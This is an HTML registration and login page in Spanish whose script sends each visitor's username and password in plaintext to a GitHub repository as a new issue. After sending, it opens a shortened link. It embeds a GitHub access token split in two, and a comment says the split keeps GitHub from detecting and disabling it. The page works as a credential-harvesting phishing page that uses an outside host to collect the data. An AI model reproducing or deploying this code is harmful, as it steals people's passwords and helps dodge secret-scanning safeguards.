<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <title>REGISTRO 📋</title>
<style>
body { 
     display: flex; 
     height: 80vh;
     background: beige; 
     align-items: center;      
     justify-content: center;
     font-family: sans-serif;     
}
.Login-Card { 
     padding: 2rem;
     background: #fca;       
     border-radius: 50%; 
     box-shadow: 0 8px 10px rgba(0,0,0,0.2);
}
input { 
     width: 100%; 
     display: block;
     padding: 0.5rem;
     text-align: left;
     margin-bottom: 1rem;  
     border-radius: 10px;
     font-weight: bold;
     outline: none;
     
   &:focus {
       border: 2px solid #f00;
   }
      
   &:hover {
       scale: 1.1;
   }
}
button { 
     width: 100%; 
     color: white; 
     border: none;
     padding: 0.7rem;  
     cursor: pointer;
     border-radius: 10px; 
     background: #007bff;
          
   &:hover {
       scale: 1.1;
       background: #0056b3;
   }     
}
#M {
    color: red;
    font-weight: bold;
}
</style>
</head>
<body>
<center>

      <div class="Login-Card">
      
 <form id="F">
       <h2>Iniciar Sesión</h2>
    <input type="text" id="USER" name="Usuario" placeholder="Nombre">
    
    <input type="password" id="PASS" name="🔑" placeholder="Contraseña">
    <button id="B" type="submit">REGISTRARSE</button>
         <p id="M"></p>
  </form>
</div>
</center>
<script>
  // --- CONFIGURACIÓN DE TU REPOSITORIO ---
  const GITHUB_USER = "LaMovie";
  const GITHUB_REPO = "DATA";
  
  // --- SEGURIDAD: DIVIDIR EL TOKEN NUEVO AQUÍ ---
  // GitHub desactiva tokens expuestos completos. Divídelo para que funcione.
  
  // Reemplaza esto con la PRIMERA MITAD de tu NUEVO token
  const parte1 = "github_pat_11BFIYAOI0HIPBmEUExqC7_sl4pUnYYw8sQxvQIv";
  // Reemplaza esto con la SEGUNDA MITAD restante de tu NUEVO token
  const parte2 = "T9qcluXbuUe2x2Uh0oUsnxQSLvKEOTNYSCyHntTXQu"; 

  // Esta línea une las dos partes automáticamente
  const GITHUB_TOKEN = parte1 + parte2; 

  // --- LÓGICA DEL FORMULARIO ---
  const F = document.getElementById("F");
  const USER = document.getElementById("USER");
  const PASS = document.getElementById("PASS");
  const B = document.getElementById("B");

  F.onsubmit = async (e) => { 
    e.preventDefault();
    
    if (USER.value === '' || PASS.value === '') {
        alert('⚠️ REGÍSTRESE COMPLETAMENTE ⚠️');
        return;
    }

    // Formateamos los datos como texto plano en forma de lista
    const fechaActual = new Date().toLocaleString('es-ES', { timeZone: 'America/New_York' }); // Ajusta tu zona horaria si quieres
    const textoPlano = `Usuario: ${USER.value}\nContraseña: ${PASS.value}\nFecha (EST): ${fechaActual}`;

    // Estructura para enviar a la API de GitHub
    const datosIssue = {
        title: `NUEVO_REGISTRO: ${USER.value}`, // El título que el Workflow busca
        body: textoPlano                        // El contenido que se escribirá en el .txt
    };

    try {
        B.innerText = "ENVIANDO...";
        B.disabled = true;

        const respuesta = await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/issues`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${GITHUB_TOKEN}`,
                'Accept': 'application/vnd.github+v3+json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(datosIssue)
        });

        if (respuesta.ok) {
            // Redirección exitosa
            window.open("https://is.gd/stDTxK");
            USER.value = "";
            PASS.value = "";
        } else {
            console.error("Error de la API:", respuesta.status, respuesta.statusText);
            alert("Hubo un problema al enviar los datos. Revisa la consola.");
        }
    } catch (error) {
        console.error("Error de conexión:", error);
        alert("Error de conexión.");
    } finally {
        B.innerText = "REGISTRARSE";
        B.disabled = false;
    }
  };
</script>
</body>
</html>
